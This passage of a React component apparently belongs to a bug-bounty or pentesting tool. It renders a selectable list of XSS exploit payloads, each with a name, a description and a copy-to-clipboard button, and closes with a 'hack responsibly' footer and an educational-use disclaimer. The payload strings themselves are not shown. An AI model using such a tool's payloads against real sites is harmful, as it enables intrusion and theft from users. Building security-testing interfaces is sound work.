                          ? "bg-red-500/20 text-red-300 border-red-500/40"
                          : "bg-white/5 text-gray-400 border-white/10 hover:border-red-500/30 hover:text-red-300"
                      }`}
                    >
                      {section.title}
                    </button>
                  ))}
                </div>
                {xssExploitSections.filter(s => s.id === xssSection).map(section => (
                  <div key={section.id} className="space-y-3">
                    {section.entries.map((entry, i) => {
                      const key = `xss-exploit-${section.id}-${i}`
                      const isCopied = copiedIndex === key
                      return (
                        <div key={i} className="p-4 bg-white/5 border border-white/10 rounded-xl space-y-2">
                          <div className="flex items-start justify-between gap-3">
                            <div>
                              <p className="text-sm font-semibold text-white">{entry.name}</p>
                              <p className="text-xs text-gray-400 mt-0.5">{entry.description}</p>
                            </div>
                            <Button
                              size="icon"
                              variant="ghost"
                              className="h-7 w-7 flex-shrink-0 hover:bg-white/20 rounded-lg"
                              onClick={() => copyToClipboard(entry.payload, key)}
                            >
                              {isCopied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5 text-gray-400" />}
                            </Button>
                          </div>
                          <pre className="p-3 bg-black/40 border border-white/10 rounded-lg text-xs font-mono text-red-300 break-all whitespace-pre-wrap leading-relaxed">
                            {entry.payload}
                          </pre>
                        </div>
                      )
                    })}
                  </div>
                ))}
              </CardContent>
            </Card>

          </div>
        )}

        {/* Footer */}
        <div className="mt-20 text-center space-y-6">
          <div className="inline-flex items-center gap-3 px-6 py-3 bg-white/10 backdrop-blur-md border border-white/20 rounded-full shadow-lg">
            <Sparkles className="h-5 w-5 text-cyan-400" />
            <span className="text-white font-semibold">Happy hunting! Remember to hack responsibly.</span>
            <Shield className="h-5 w-5 text-green-400" />
          </div>
          
          {/* Disclaimer */}
          <div className="max-w-4xl mx-auto">
            <div className="bg-red-500/10 border border-red-500/30 rounded-2xl p-6 backdrop-blur-md">
              <div className="flex items-center justify-center gap-3 mb-3">
                <AlertTriangle className="h-6 w-6 text-red-400" />
                <h3 className="text-lg font-bold text-red-400">Important Disclaimer</h3>
              </div>
              <p className="text-red-300 text-sm leading-relaxed">
                ⚠️ <strong>For educational and authorized security research only.</strong>
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
